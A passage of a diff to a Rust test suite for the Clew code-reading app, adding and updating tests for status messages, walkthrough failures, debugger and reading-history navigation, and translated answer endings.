+    let _ = app.update(Message::Explain(ExplainMsg::Show(
+        crate::explain::Node::File(abs),
+    )));
+    assert_eq!(app.status, "Add an API key in Settings");
+}
+
+/// With no project open, the finder (Ctrl+P, the field over the window)
+/// opens the command bar, with its Open Folder: it did nothing.
+#[test]
+fn the_finder_with_no_project_opens_the_command_bar() {
+    let mut app = scanned_app("no-project-finder");
+    app.proj.project = None;
+    let _ = app.update(Message::Nav(NavMsg::FinderOpened(FinderMode::Files)));
+    assert!(app.proj.finder.open, "opened");
+    assert!(app.proj.finder.bar, "as the command bar");
+}
+
+/// A server the status bar's Set up fetched is said to be in once it is:
+/// "Downloading rust-analyzer…" stayed on, beside the server's own "ready".
+#[test]
+fn a_server_set_up_is_said_to_be_in() {
+    let mut app = scanned_app("fetched-said");
+    app.status = "Downloading rust-analyzer…".into();
+    let _ = app.on_lsp_fetched("rust".into(), Ok(PathBuf::from("/opt/rust-analyzer")));
+    assert_eq!(app.status, "Rust server installed");
+}
+
 /// Skim is a toggle like Diff and Time Travel, and its button says so: it
 /// shows pressed while the file's bodies are folded, and not once a second
 /// press has unfolded them.
@@ -19558,7 +21369,10 @@ fn the_skim_button_shows_whether_the_file_is_skimmed() {
         }]),
     );
     let lines = app.skim_lines(&abs);
-    assert_eq!(lines, [2]);
+    assert_eq!(
+        lines.iter().map(|&(start, _)| start).collect::<Vec<_>>(),
+        [2]
+    );
     assert!(!app.active_viewer().unwrap().skimmed(&lines));
     let _ = app.update(Message::Editor(EditorMsg::SkimFile));
     assert!(app.active_viewer().unwrap().skimmed(&lines));
@@ -19721,6 +21535,7 @@ fn the_debuggers_state_reaches_a_prompt_as_data() {
     app.debug.session = Some(DebugSession {
         client: None,
         status: DebugStatus::Stopped,
+        exit_code: None,
         thread_id: Some(1),
         frames: vec![crate::dap::StackFrame {
             id: 1,
@@ -19781,6 +21596,48 @@ fn the_debuggers_state_reaches_a_prompt_as_data() {
     );
 }
 
+/// L10: stepping between two functions over and over records each once in
+/// the reading trail — it filled with alternating "tax() / total()" rows.
+#[test]
+fn stepping_back_and_forth_records_each_function_once_in_the_trail() {
+    let mut app = scanned_app("debug-trail-once");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    app.debug.session = Some(DebugSession {
+        client: None,
+        status: DebugStatus::Stopped,
+        exit_code: None,
+        thread_id: Some(1),
+        frames: Vec::new(),
+        scopes: Vec::new(),
+        watches: Vec::new(),
+        output: Vec::new(),
+        current: None,
+        program: root.join("app"),
+        args: Vec::new(),
+        cwd: root.clone(),
+        addr: None,
+    });
+    let frame = |name: &str, line: usize| crate::dap::StackFrame {
+        id: 1,
+        name: name.into(),
+        path: Some(root.join("src/lib.rs")),
+        line,
+        column: 1,
+    };
+    for _ in 0..4 {
+        let _ = app.on_dap_stop_inspected(vec![frame("tax", 2)], Vec::new(), true);
+        let _ = app.on_dap_stop_inspected(vec![frame("total", 4)], Vec::new(), true);
+    }
+    let labels: Vec<String> = app
+        .proj
+        .history
+        .flatten()
+        .into_iter()
+        .filter_map(|v| v.label)
+        .collect();
+    assert_eq!(labels, ["tax", "total"], "the trail flooded");
+}
+
 /// A debug run's trace: each inspected stop is recorded with the reason the
 /// adapter gave and the stack it stopped with, up to the cap (then marked
 /// cut); "Walk the last run" without a model stores the plain tour of it in
@@ -19792,6 +21649,7 @@ fn a_debug_runs_stops_are_traced_and_walked() {
     app.debug.session = Some(DebugSession {
         client: None,
         status: DebugStatus::Stopped,
+        exit_code: None,
         thread_id: Some(1),
         frames: Vec::new(),
         scopes: Vec::new(),
@@ -19844,6 +21702,11 @@ fn a_debug_runs_stops_are_traced_and_walked() {
         .find(|w| w.scope == "@trace app")
         .expect("the run's tour");
     assert_eq!(tour.title, "Run: app");
+    // M15: dated, as runs of one program share its name.
+    assert!(tour.made.is_some(), "which run it shows");
+    // L5: under "Debug run of app", when alone — not the run named again.
+    assert_eq!(crate::ui::walk_title(tour), "Debug run of app");
+    assert_eq!(crate::ui::walk_subtitle(tour), "just now");
     let symbols: Vec<&str> = tour
         .steps
         .iter()
@@ -20176,6 +22039,43 @@ fn a_superseded_overview_or_search_leaves_the_newer_requests_spinner_alone() {
     assert_eq!(app.status, "Search failed: boom");
 }
 
+/// A walkthrough that fails in the Walk view, where its row says why,
+/// leaves nothing it was saying behind on the status line: "Generating
+/// walkthrough…" stood there for good beside the row's "Failed: …" — nor
+/// an older walkthrough's notice, whose Try again asked for the old one.
+#[test]
+fn a_walkthrough_failing_in_view_leaves_no_busy_words() {
+    let mut app = scanned_app("walk-fail-in-view");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    app.sidebar = crate::SidebarTab::Walk;
+    app.show_left_sidebar = true;
+    app.say_failure_again(
+        || "Walkthrough failed: before".to_string(),
+        Some(Message::Walk(WalkMsg::Generate("before".into()))),
+        crate::app::state::FailureOf::Walkthrough,
+    );
+    app.proj.walk.seq += 1;
+    let seq = app.proj.walk.seq;
+    app.proj.walk.pending = Some(seq);
+    app.proj.walk.generating = Some("checkout".into());
+    app.status = crate::tr!("Generating walkthrough…").into();
+    let _ = app.update(Message::Walk(WalkMsg::Done {
+        stamp: Stamp {
+            root: Some(root.clone()),
+            epoch: app.project_epoch,
+            conn: None,
+        },
+        seq,
+        scope: "checkout".into(),
+        result: Err(walkthrough::Failure::from(
+            "request failed: Connection refused".to_string(),
+        )),
+    }));
+    assert!(app.proj.walk.failed.is_some(), "its row says why");
+    assert!(!app.status.ends_with('…'), "{:?}", app.status);
+    assert!(app.failure_shown().is_none(), "an older notice stood");
+}
+
 /// D1-9: a walkthrough generation the user has since replaced keeps what it
 /// paid for (the tour is saved) but does not pull the reader into it, clear
 /// the busy row of the generation now running, or spend its retry.
@@ -20184,6 +22084,7 @@ fn a_superseded_walkthrough_is_kept_but_not_opened_and_leaves_the_busy_row() {
     let mut app = scanned_app("walk-superseded");
     let root = app.proj.project.as_ref().unwrap().root.clone();
     let tour = |title: &str| walkthrough::Walkthrough {
+        made: None,
         title: title.into(),
         scope: String::new(),
         steps: vec![walkthrough::Step {
@@ -20192,6 +22093,8 @@ fn a_superseded_walkthrough_is_kept_but_not_opened_and_leaves_the_busy_row() {
             symbol: None,
             line: Some(1),
             narration: "n".into(),
+            depth: 0,
+            stop: None,
         }],
     };
     app.proj.walk.seq += 1;
@@ -20972,23 +22875,15 @@ fn every_tools_menu_row_dismisses_the_menu() {
     let emits = |row: ToolsRow| -> Vec<Message> {
         match row {
             ToolsRow::Tutorial => vec![Message::Tutorial(TutorialMsg::Start)],
-            ToolsRow::OpenFolder => vec![Message::Project(ProjectMsg::OpenFolderPressed)],
-            ToolsRow::OpenRemote => vec![Message::Connect(ConnectMsg::Open)],
             ToolsRow::ExplainAll => vec![
                 Message::Project(ProjectMsg::SetupShow(crate::app::setup::SetupMode::Explain)),
-                Message::Settings(SettingsMsg::OpenAt(crate::SettingsPage::LanguageModel)),
+                Message::Settings(SettingsMsg::NeedKey),
                 Message::Explain(ExplainMsg::Cancel),
             ],
             ToolsRow::SetUp => vec![Message::Project(ProjectMsg::SetupShow(
                 crate::app::setup::SetupMode::Manage,
             ))],
-            ToolsRow::Walkthrough => vec![Message::Window(WindowMsg::SidebarTabPicked(
-                SidebarTab::Walk,
-            ))],
             ToolsRow::Glossary => vec![Message::Glossary(GlossaryMsg::Open)],
-            ToolsRow::ExportNotes => vec![Message::Export(ExportMsg::Start)],
-            ToolsRow::LspServers => vec![Message::Lsp(LspMsg::TogglePanel)],
-            ToolsRow::Shortcuts => vec![Message::Window(WindowMsg::OpenShortcuts)],
         }
     };
     for row in TOOLS_MENU_ROWS {
@@ -21001,7 +22896,7 @@ fn every_tools_menu_row_dismisses_the_menu() {
     }
     let mut app = blank_app();
     // Short enough for the ⋯ menu's tools to be in it, not on the strip.
-    app.window_height = 600.0;
+    app.window_height = 520.0;
     app.show_tools_menu = true;
     let _ = app.update(Message::Window(WindowMsg::OpenShortcuts));
     assert!(!app.show_tools_menu, "picking a row left the menu open");
@@ -21066,12 +22961,7 @@ fn every_llm_flow_reports_a_missing_key_the_same_way() {
         );
         let out = run_task(task);
         assert!(
-            matches!(
-                out.as_slice(),
-                [Message::Settings(SettingsMsg::OpenAt(
-                    SettingsPage::LanguageModel
-                ))]
-            ),
+            matches!(out.as_slice(), [Message::Settings(SettingsMsg::NeedKey)]),
             "{what} did not offer Settings: {out:?}"
         );
     }
@@ -21148,12 +23038,7 @@ fn every_llm_flow_reports_a_missing_key_the_same_way() {
         );
         let out = run_task(task);
         assert!(
-            matches!(
-                out.as_slice(),
-                [Message::Settings(SettingsMsg::OpenAt(
-                    SettingsPage::LanguageModel
-                ))]
-            ),
+            matches!(out.as_slice(), [Message::Settings(SettingsMsg::NeedKey)]),
             "{what} did not offer Settings: {out:?}"
         );
         if what.contains("Ask") {
@@ -21268,6 +23153,7 @@ fn a_watch_is_removed_by_identity_from_both_lists() {
     app.debug.session = Some(DebugSession {
         client: None,
         status: DebugStatus::Stopped,
+        exit_code: None,
         thread_id: None,
         frames: Vec::new(),
         scopes: Vec::new(),
@@ -21335,6 +23221,7 @@ fn opening_a_text_input_form_takes_the_keyboard_from_the_code() {
         insight: None,
         served: true,
         by_pointer: true,
+        line_top: None,
     });
     let _ = app.update(Message::Debug(DebugMsg::ConditionalBreakpointFromMenu));
     assert_eq!(app.proj.bp_cond_edit.as_ref().map(|e| &e.0), Some(&abs));
@@ -21887,6 +23774,7 @@ fn stamped_samples(app: &App, stamp: &Stamp) -> Vec<Message> {
             stamp: s(),
             state: Handoff::new(LoadedProjectState {
                 history: None,
+                gone: Vec::new(),
                 bookmarks: None,
                 notes: None,
                 lsp_config: None,
@@ -21915,6 +23803,28 @@ fn stamped_samples(app: &App, stamp: &Stamp) -> Vec<Message> {
         Message::Project(ProjectMsg::GitStatusRead {
             stamp: s(),
             result: Ok(vec![("stale.rs".into(), 'M')]),
+        }),
+        Message::Project(ProjectMsg::HeadRead {
+            stamp: s(),
+            result: Ok(Some(clew_protocol::HeadName::Branch("stale".into()))),
+        }),
+        Message::History(HistoryMsg::Loaded {
+            stamp: s(),
+            generation: app.proj.git_log.generation,
+            skip: 0,
+            result: Ok(clew_protocol::LogPage {
+                commits: Vec::new(),
+                more: false,
+            }),
+        }),
+        Message::History(HistoryMsg::DetailRead {
+            stamp: s(),
+            sha: "a".repeat(40),
+            result: Ok(None),
+        }),
+        Message::History(HistoryMsg::TipRead {
+            stamp: s(),
+            result: Ok(Some("a".repeat(40))),
         }),
         Message::Watch(WatchMsg::SymbolIndexDone {
             stamp: s(),
@@ -22096,6 +24006,10 @@ fn stamped_samples(app: &App, stamp: &Stamp) -> Vec<Message> {
             token: app.insight_seq,
             result: Err("stale".into()),
         }),
+        Message::Hover(HoverMsg::GutterDue {
+            stamp: s(),
+            generation: app.proj.gutter_seq,
+        }),
         Message::Nav(NavMsg::DefinitionResult {
             stamp: s(),
             seq: app.proj.goto_seq,
@@ -22117,12 +24031,18 @@ fn stamped_samples(app: &App, stamp: &Stamp) -> Vec<Message> {
             styled: Vec::new(),
             marks: Vec::new(),
         }),
+        Message::Nav(NavMsg::CallSiteFound {
+            stamp: s(),
+            caller_file: abs.clone(),
+            line: 3,
+        }),
         Message::Calls(CallsMsg::Prepared {
             stamp: s(),
             token: app.call_token,
             direction: callgraph::Direction::Incoming,
             lang: "rust",
             items: Vec::new(),
+            again: None,
         }),
         Message::Calls(CallsMsg::Children {
             stamp: s(),
@@ -22224,6 +24144,11 @@ fn stamped_samples(app: &App, stamp: &Stamp) -> Vec<Message> {
             scope: String::new(),
             result: Err("stale".into()),
         }),
+        Message::Walk(WalkMsg::Unnarrated {
+            stamp: s(),
+            seq: app.proj.walk.seq,
+            why: "stale".into(),
+        }),
         Message::Overview(OverviewMsg::Done {
             stamp: s(),
             seq: app.proj.overview.seq,
@@ -22263,6 +24188,17 @@ fn stamped_samples(app: &App, stamp: &Stamp) -> Vec<Message> {
             stamp: s(),
             stream: 1,
             text: "stale".into(),
+        }),
+        Message::Ask(AskMsg::Draft {
+            stamp: s(),
+            stream: 1,
+            text: "stale".into(),
+        }),
+        Message::Ask(AskMsg::DraftEnd {
+            stamp: s(),
+            stream: 1,
+            kept: false,
+            again: false,
         }),
         Message::Ask(AskMsg::StreamEnded {
             stamp: s(),
@@ -22467,6 +24403,57 @@ fn stamped_samples(app: &App, stamp: &Stamp) -> Vec<Message> {
             run,
             install: crate::dap::AdapterInstall::JsDebug,
         }),
+        Message::Fake(crate::FakeMsg::Suggested {
+            stamp: s(),
+            seq: 1,
+            result: Ok(Vec::new()),
+        }),
+        Message::Fake(crate::FakeMsg::Read {
+            stamp: s(),
+            stream: 1,
+            title: "stale".into(),
+        }),
+        Message::Fake(crate::FakeMsg::Delta {
+            stamp: s(),
+            stream: 1,
+            text: "stale".into(),
+        }),
+        Message::Fake(crate::FakeMsg::Draft {
+            stamp: s(),
+            stream: 1,
+            text: "stale".into(),
+        }),
+        Message::Fake(crate::FakeMsg::DraftEnd {
+            stamp: s(),
+            stream: 1,
+            kept: true,
+        }),
+        Message::Fake(crate::FakeMsg::ToolCalled {
+            stamp: s(),
+            stream: 1,
+            call: 1,
+        }),
+        Message::Fake(crate::FakeMsg::TurnEnded {
+            stamp: s(),
+            stream: 1,
+            outcome: clew_protocol::StreamOutcome::Done,
+        }),
+        Message::Fake(crate::FakeMsg::Answered {
+            stamp: s(),
+            seq: 1,
+            result: Ok(String::new()),
+        }),
+        Message::Proof(crate::ProofMsg::Answered {
+            stamp: s(),
+            token: 1,
+            result: Ok(Vec::new()),
+        }),
+        Message::Weak(crate::WeakMsg::Built {
+            stamp: s(),
+            rev: 1,
+            files: 0,
+            result: Ok(Vec::new()),
+        }),
     ]
 }
 
@@ -22655,6 +24642,7 @@ fn fill_project_session(app: &mut App) {
         insight: None,
         served: true,
         by_pointer: true,
+        line_top: None,
     });
     p.diff = Some(DiffState::new(
         file.clone(),
@@ -22670,6 +24658,9 @@ fn fill_project_session(app: &mut App) {
         commits: Vec::new(),
         loading: true,
         prepared: Vec::new(),
+        fix: None,
+        asked: None,
+        failed: false,
     });
     p.overlay = Some(Overlay::ProjectImports);
     p.hover_gen = 9;
@@ -22727,6 +24718,7 @@ fn fill_project_session(app: &mut App) {
             declarations: HashSet::from([1]),
             bodies: HashMap::new(),
             owners: HashMap::new(),
+            accessed: HashSet::new(),
         }),
     );
     p.tracked_ignored.insert("src/lib.rs".into());
@@ -22755,6 +24747,7 @@ fn fill_project_session(app: &mut App) {
         answer_md: "a".into(),
         answer: Vec::new(),
         settled: 0,
+        draft_from: None,
         sources: Vec::new(),
         steps: Vec::new(),
         streaming: true,
@@ -23431,6 +25424,7 @@ fn a_stopped_agent_turn_never_falls_back_to_a_paid_answer() {
             answer_md: String::new(),
             answer: Vec::new(),
             settled: 0,
+            draft_from: None,
             sources: Vec::new(),
             steps: Vec::new(),
             streaming: true,
@@ -23508,6 +25502,17 @@ impl CountingProvider {
             // no listener to a port in TIME_WAIT unless the socket that left
             // it had SO_REUSEADDR too, and the port read as taken.
             drop(peer);
+            // And reaches the held end before that closes: read to its end
+            // of stream. Closed before the FIN came — a loaded machine late
+            // with it — the two ends closed at once, both were left in
+            // TIME_WAIT, the handed-over port too, and no listener could be
+            // bound to it for a minute.
+            let mut held = held;
+            held.set_read_timeout(Some(std::time::Duration::from_secs(30)))
+                .expect("a read timeout");
+            let mut byte = [0u8; 1];
+            let read = std::io::Read::read(&mut held, &mut byte);
+            assert!(matches!(read, Ok(0)), "the peer's close came: {read:?}");
             drop(held);
             drop(other);
             // The held end's close is answered at once on loopback; the port
@@ -23700,6 +25705,22 @@ fn explained_project(tag: &str) -> (App, PathBuf, CountingProvider) {
     drive(&mut app, explicit, explain_and_save);
     assert_eq!(provider.calls(), 7, "{}", app.status);
     (app, root, provider)
+}
+
+/// Explain All is said by the explaining chip alone ("Explaining 0/45"):
+/// "Explaining project…" on the status line beside it said it twice.
+#[test]
+fn explain_all_is_said_once() {
+    let mut app = scanned_app("explain-all-said-once");
+    app.llm_available = true;
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    let _ = app.update(Message::Explain(ExplainMsg::Project));
+    assert!(app.proj.explain.running, "{}", app.status);
+    assert!(
+        !app.status.contains("Explaining"),
+        "said twice: {:?}",
+        app.status
+    );
 }
 
 /// `name`'s function node in `rel`.
@@ -24333,7 +26354,7 @@ fn a_local_file_that_could_not_be_read_keeps_every_summary() {
     );
     assert!(
         app.status
-            .starts_with("Nothing re-explained · 1 file could not be read"),
+            .starts_with("Nothing re-explained; 1 file could not be read"),
         "{}",
         app.status
     );
@@ -24617,7 +26638,7 @@ fn a_pass_that_could_not_read_the_project_changes_nothing() {
     assert_eq!(explain::load(&store, &root), before, "on disk");
     assert_eq!(
         app.status,
-        "Explain stopped: Clew failed internally (while reading the project) — try again, \
+        "Explain couldn't continue: Clew failed internally (while reading the project) — try again, \
          and report it if it happens again"
     );
 }
@@ -24642,7 +26663,7 @@ fn a_pass_over_a_project_folder_that_is_gone_changes_nothing() {
     assert_eq!(explain::load(&store, &root), before, "on disk");
     assert!(
         app.status
-            .starts_with("Explain stopped: the project folder could not be read (")
+            .starts_with("Explain couldn't continue: the project folder could not be read (")
             && app
                 .status
                 .ends_with("— nothing was changed; check that it is still there"),
@@ -24733,7 +26754,7 @@ fn a_remote_file_too_large_to_explain_is_said_so_and_asked_for_once() {
     assert_eq!(helper_asked(&batches), 1, "{batches:?}");
     assert_eq!(
         app.status,
-        "Explained 4 functions, files and folders · src/util/helper.rs is too large to explain \
+        "Explained 4 functions, files and folders; src/util/helper.rs is too large to explain \
          (2.3 MB) — its summaries are dropped"
     );
     assert_eq!(
@@ -24777,7 +26798,7 @@ fn a_host_that_settles_nothing_is_not_asked_forever() {
     assert_eq!(*app.proj.explain.cache, before);
     assert!(
         app.status.ends_with(
-            "· 2 files could not be read (src/lib.rs, src/util/helper.rs) — their summaries \
+            "; 2 files could not be read (src/lib.rs, src/util/helper.rs) — their summaries \
              are kept until they can be"
         ),
         "{}",
@@ -24801,7 +26822,7 @@ fn a_local_file_that_can_no_longer_be_explained_is_dropped_and_said_so() {
     assert_eq!(
         app.status,
         format!(
-            "Explained 4 functions, files and folders · src/util/helper.rs is too large to explain \
+            "Explained 4 functions, files and folders; src/util/helper.rs is too large to explain \
              ({size}) — its summaries are dropped"
         )
     );
@@ -24838,7 +26859,7 @@ fn a_local_file_that_can_no_longer_be_explained_is_dropped_and_said_so() {
     drive(&mut app, refresh, explain_and_save);
     assert!(
         app.status
-            .ends_with("· src/util/helper.rs is not UTF-8 text — its summaries are dropped"),
+            .ends_with("; src/util/helper.rs is not UTF-8 text — its summaries are dropped"),
         "{}",
         app.status
     );
@@ -24922,7 +26943,7 @@ fn a_local_file_saved_while_it_was_read_is_read_as_it_was_saved() {
     assert_eq!(*app.proj.explain.cache, before, "{}", app.status);
     assert!(
         app.status
-            .contains("· 1 file could not be read (src/util/helper.rs)"),
+            .contains("; 1 file could not be read (src/util/helper.rs)"),
         "{}",
         app.status
     );
@@ -24954,7 +26975,7 @@ fn a_file_that_can_no_longer_be_explained_is_said_to_be_what_it_is() {
     drive(&mut app, pass, explain_and_save);
     assert!(
         app.status.ends_with(
-            "· 2 files can no longer be explained (src/lib.rs (not a plain file), \
+            "; 2 files can no longer be explained (src/lib.rs (not a plain file), \
              src/util/helper.rs (outside the project)) — their summaries are dropped"
         ),
         "{}",
@@ -24967,7 +26988,7 @@ fn a_file_that_can_no_longer_be_explained_is_said_to_be_what_it_is() {
     std::os::unix::fs::symlink(&away, root.join("src/util/helper.rs")).unwrap();
     let pass = app.update(Message::Explain(ExplainMsg::Project));
     drive(&mut app, pass, explain_and_save);
-    let out = "· src/util/helper.rs resolves outside the project — its summaries are dropped";
+    let out = "; src/util/helper.rs resolves outside the project — its summaries are dropped";
     assert!(app.status.ends_with(out), "{}", app.status);
     // ... or a link to a file of the project.
     let (mut app, root, _provider) = helper_project("explain-said-link-in");
@@ -24976,7 +26997,7 @@ fn a_file_that_can_no_longer_be_explained_is_said_to_be_what_it_is() {
     std::os::unix::fs::symlink(&kept, root.join("src/util/helper.rs")).unwrap();
     let pass = app.update(Message::Explain(ExplainMsg::Project));
     drive(&mut app, pass, explain_and_save);
-    let not_plain = "· src/util/helper.rs is not a plain file — its summaries are dropped";
+    let not_plain = "; src/util/helper.rs is not a plain file — its summaries are dropped";
     assert!(app.status.ends_with(not_plain), "{}", app.status);
 
     let host = remote_helper_host(Some(HELPER));
@@ -25124,7 +27145,7 @@ fn a_request_the_provider_refused_is_said_to_be_refused() {
     assert_eq!(provider.calls() - before, 1, "{}", app.status);
     assert!(
         app.status.starts_with(
-            "Explain stopped: the provider has no model `test-model` at this endpoint ("
+            "Explain couldn't continue: the provider has no model `test-model` at this endpoint ("
         ) && app.status.contains("404")
             && app
                 .status
@@ -25141,7 +27162,7 @@ fn a_request_the_provider_refused_is_said_to_be_refused() {
     drive(&mut app, refresh, explain_and_save);
     assert!(
         app.status
-            .starts_with("Explain stopped: the provider rejected the API key (")
+            .starts_with("Explain couldn't continue: the provider rejected the API key (")
             && app.status.contains("401")
             && app.status.ends_with("— check it in Settings"),
         "{}",
@@ -25211,9 +27232,11 @@ fn a_connection_that_failed_is_said_to_have_failed() {
         calls, 2,
         "a request the provider had read was not sent again, once: {status}"
     );
+    // Reached, then lost: not the base URL's doing.
     assert!(
-        status.contains("1 failed: the connection failed (request failed")
-            && status.ends_with("— check the network and try again"),
+        status.contains("1 failed: the connection to the AI was lost (")
+            && !status.contains("base URL")
+            && !status.contains("request failed"),
         "{status}"
     );
 
@@ -25384,7 +27407,7 @@ fn a_pass_whose_calls_were_cancelled_says_so() {
     let _ = run_task(app.update(done));
     assert_eq!(
         app.status,
-        "Explain stopped: its requests were cancelled — run it again to finish"
+        "Explain couldn't continue: its requests were cancelled — run it again to finish"
     );
     assert_eq!(*app.proj.explain.cache, before);
 }
@@ -25424,11 +27447,11 @@ fn a_prompt_refused_for_its_length_freezes_nothing_that_quotes_it() {
     assert_ne!(app.proj.explain.cache[&top].summary, before.summary);
     assert!(
         app.status.starts_with(
-            "Explained 7 functions, files and folders · 1 failed: the prompt is too long for the \
+            "Explained 7 functions, files and folders; 1 failed: the prompt is too long for the \
              model ("
         ) && app
             .status
-            .contains("· 1 explained without the failed summaries it builds on")
+            .contains("; 1 explained without the failed summaries it builds on")
             && !app.status.contains("2 failed"),
         "{}",
         app.status
@@ -25475,7 +27498,7 @@ fn a_summary_that_keeps_failing_is_waited_for_once() {
     );
     assert!(
         app.status
-            .contains("· 1 explained without the failed summaries it builds on"),
+            .contains("; 1 explained without the failed summaries it builds on"),
         "{}",
         app.status
     );
@@ -25520,7 +27543,7 @@ fn a_summary_waits_once_a_session_whatever_passes_come_between() {
     );
     assert!(
         app.status
-            .contains("· 1 explained without the failed summaries it builds on"),
+            .contains("; 1 explained without the failed summaries it builds on"),
         "{}",
         app.status
     );
@@ -25890,7 +27913,7 @@ fn the_tour_gives_the_layout_back() {
         Message::Tutorial(TutorialMsg::Exit),
         Message::Tutorial(TutorialMsg::Step(1_000)),
     ] {
-        let _ = app.update(Message::Tutorial(TutorialMsg::Start));
+        let _ = app.update(Message::Tutorial(TutorialMsg::Begin));
         let _ = app.update(Message::Tutorial(TutorialMsg::Step(1)));
         assert!(app.tutorial.is_some());
         let _ = app.update(end);
@@ -25912,6 +27935,80 @@ fn go_to_line_without_a_number_opens_nothing() {
     let _ = app.update(Message::Nav(NavMsg::FinderConfirm));
     assert_eq!(app.active_viewer().unwrap().rel, "src/lib.rs");
     assert!(app.proj.finder.open, "the finder stays for the number");
+}
+
+/// Back from a jump returns to where the reader was in the file it left,
+/// through the app's own jump: a caret left where the file opened is no
+/// place of its own (Back passes the file's top, its screen unchanged); a
+/// caret moved within a function makes that place the stop, once.
+#[test]
+fn back_from_a_jump_returns_to_where_the_reader_was() {
+    let mut app = scanned_app("back-from-jump");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    std::fs::write(
+        root.join("shop.py"),
+        "def first():\n    a = 1\n    b = 2\n    return a + b\n\n\ndef second():\n    return 3\n",
+    )
+    .unwrap();
+    std::fs::write(root.join("notes.md"), "notes\n").unwrap();
+    open_synchronously(&mut app, "notes.md", None);
+    open_synchronously(&mut app, "shop.py", None);
+    let lh = app.line_height();
+    {
+        let v = app.active_viewer_mut().unwrap();
+        v.viewport_measured = true;
+        v.viewport_h = 40.0 * lh;
+        v.caret = Some((0, 0));
+    }
+    let jump = |app: &mut App, line: usize| {
+        let _ = app.update(Message::Editor(EditorMsg::OpenRel {
+            rel: "shop.py".into(),
+            line: Some(line),
+        }));
+    };
+    // The caret where the file opened: Back passes the file's top.
+    jump(&mut app, 7);
+    let _ = app.update(Message::Reading(ReadingMsg::GoBack));
+    let back = app.proj.history.current_loc().cloned().unwrap();
+    assert!(back.path.ends_with("notes.md"), "{back:?}");
+    // Forward, then into `first` and down its body, and a jump: Back is
+    // to the line left, and once more passes the file's top.
+    let _ = app.update(Message::Reading(ReadingMsg::GoForward));
+    jump(&mut app, 1);
+    app.active_viewer_mut().unwrap().caret = Some((2, 0));
+    jump(&mut app, 7);
+    let _ = app.update(Message::Reading(ReadingMsg::GoBack));
+    let back = app.proj.history.current_loc().cloned().unwrap();
+    assert!(
+        back.path.ends_with("shop.py") && back.line == Some(3),
+        "{back:?}"
+    );
+    // One stop in `first` — the line left — then the jump before it, and
+    // past the file's top to where the reading began.
+    let _ = app.update(Message::Reading(ReadingMsg::GoBack));
+    let back = app.proj.history.current_loc().cloned().unwrap();
+    assert!(
+        back.path.ends_with("shop.py") && back.line == Some(7),
+        "{back:?}"
+    );
+    let _ = app.update(Message::Reading(ReadingMsg::GoBack));
+    let back = app.proj.history.current_loc().cloned().unwrap();
+    assert!(back.path.ends_with("notes.md"), "{back:?}");
+}
+
+/// Go to Line past the end goes to the last line: line 99 of a 5-line
+/// file was gone to, said as the caret's place, and kept as a stop.
+#[test]
+fn go_to_line_past_the_end_goes_to_the_last() {
+    let mut app = scanned_app("goto-past-end");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let _ = app.on_goto_line_requested();
+    let _ = app.update(Message::Nav(NavMsg::FinderQueryChanged(":99".into())));
+    assert_eq!(app.proj.finder.goto_line(), Some(99));
+    let _ = app.update(Message::Nav(NavMsg::FinderConfirm));
+    let v = app.active_viewer().unwrap();
+    assert_eq!(v.target_line, Some(5));
+    assert_eq!(app.proj.history.current_loc().and_then(|l| l.line), Some(5));
 }
 
 /// Browse… picks what its field names — a JDK's home is a folder, a
@@ -25999,6 +28096,7 @@ fn time_travel_steps_with_the_arrow_chords_only() {
         scroll_x: 0.0,
         caret: None,
         focus_line: None,
+        reveal_change: false,
         loading: false,
         generation: app.proj.time_gen,
         session: app.proj.time_gen,
@@ -26035,6 +28133,111 @@ fn time_travel_steps_with_the_arrow_chords_only() {
     assert_eq!(idx(&app), 1, "⌘→ steps to the newer commit");
 }
 
+/// M16: an answer's ending — why it failed, that it was stopped — is said
+/// again in the language chosen: "Couldn't answer: …" stood in English
+/// above French answers in one conversation.
+#[test]
+fn an_answers_ending_is_said_again_in_the_language_chosen() {
+    use crate::i18n::{Lang, with_lang};
+    use clew_protocol::StreamOutcome;
+    let mut app = scanned_app("ask-ending-language");
+    let _rx = attach_server(&mut app);
+    for outcome in [
+        StreamOutcome::Stopped,
+        StreamOutcome::Failed("cancelled".into()),
+    ] {
+        let stream = app.mint_request_id();
+        let task = app.start_ask_stream(
+            PendingAsk {
+                stream,
+                question: "why?".into(),
+                sources: Vec::new(),
+                spoken: false,
+            },
+            unreachable_llm(),
+            "system".into(),
+            vec![llm::ChatMsg::user("why?")],
+        );
+        let _ = app.handle_server_event(clew_protocol::Event::ChatStreamDone { stream, outcome });
+        drive(&mut app, task, |m| {
+            matches!(m, Message::Ask(AskMsg::StreamEnded { .. }))
+        });
+    }
+    let english: Vec<String> = app
+        .proj
+        .ask_turns
+        .iter()
+        .map(|t| t.answer_md.clone())
+        .collect();
+    assert_eq!(english.len(), 2);
+    let _ = with_lang(Lang::Fr, || app.respeak_turn_endings());
+    for (turn, was) in app.proj.ask_turns.iter().zip(&english) {
+        let (end, said) = turn.extras.ended.clone().expect("how it ended");
+        assert_ne!(&turn.answer_md, was, "still in English");
+        assert_eq!(turn.answer_md, said);
+        assert_eq!(
+            said,
+            with_lang(Lang::Fr, || crate::app::ask::turn_end_words(&end))
+        );
+        assert!(!turn.answer.is_empty(), "not drawn again");
+    }
+    // Said again in the language it is in: nothing changes.
+    let french: Vec<String> = app
+        .proj
+        .ask_turns
+        .iter()
+        .map(|t| t.answer_md.clone())
+        .collect();
+    let _ = with_lang(Lang::Fr, || app.respeak_turn_endings());
+    let again: Vec<String> = app
+        .proj
+        .ask_turns
+        .iter()
+        .map(|t| t.answer_md.clone())
+        .collect();
+    assert_eq!(again, french);
+
+    // Through Display language itself, and the reason with it: a failure
+    // said in French — the server gone, part-way or before a word — reads
+    // in English once English is chosen, its reason too ("serveur
+    // déconnecté" stayed, made in French where it was raised).
+    let mut app = scanned_app("ask-ending-language-chosen");
+    app.ask_view = AskView::Compact;
+    for (stream, part) in [(7, ""), (8, "Half of it")] {
+        app.proj.ask_turns.push(AskTurn {
+            stream,
+            question: "why?".into(),
+            answer_md: part.into(),
+            streaming: true,
+            ..Default::default()
+        });
+        with_lang(Lang::Fr, || {
+            let _ = app.update(Message::Ask(AskMsg::StreamEnded {
+                stamp: app.stamp(),
+                stream,
+                outcome: StreamOutcome::Failed("server disconnected".into()),
+            }));
+        });
+    }
+    for turn in &app.proj.ask_turns {
+        assert!(
+            turn.answer_md.contains("serveur déconnecté"),
